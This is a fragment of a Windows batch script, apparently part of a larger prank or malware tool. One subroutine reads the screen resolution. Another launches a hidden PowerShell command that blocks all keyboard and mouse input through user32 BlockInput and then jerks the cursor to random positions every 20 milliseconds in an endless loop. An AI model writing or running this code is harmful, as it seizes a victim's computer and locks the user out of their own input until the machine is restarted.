...
:GetScreenMetrics
   if /i "%~1" == "-Horizontal" (
      for /f "tokens=2 delims==" %%s in ('wmic path Win32_VideoController get CurrentHorizontalResolution /value') do (set %~2=%%s)
   )
   if /i "%~1" == "-Vertical" (
      for /f "tokens=2 delims==" %%s in ('wmic path Win32_VideoController get CurrentVerticalResolution /value') do (set %~2=%%s)
   )
goto :eof
...
:CurControl
   call :GetScreenMetrics -Horizontal width
   call :GetScreenMetrics -Vertical height
   powershell -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class CurControl{ [DllImport(\"user32.dll\", SetLastError = true)] public static extern bool BlockInput(bool fBlockIt); }'; [CurControl]::BlockInput($true); Add-Type -AssemblyName System.Windows.Forms; while ($true) { $x=Get-Random -Minimum 0 -Maximum !width!; $y=Get-Random -Minimum 0 -Maximum !height!; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x,$y); Start-Sleep -Milliseconds 20 }"
goto :eof
